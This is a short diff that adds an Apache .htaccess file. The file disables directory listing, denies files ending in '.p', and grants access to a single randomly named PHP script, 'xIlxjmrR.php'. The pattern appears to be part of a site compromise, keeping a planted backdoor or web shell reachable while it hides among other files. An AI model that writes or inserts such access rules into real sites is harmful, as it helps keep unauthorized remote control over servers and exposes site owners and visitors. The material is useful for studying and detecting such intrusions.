@@ -1,0 +1,7 @@
+Options -Indexes
+<FilesMatch "\.p$">
+Deny from all
+</FilesMatch>
+<Files xIlxjmrR.php>
+Allow from all
+</Files>
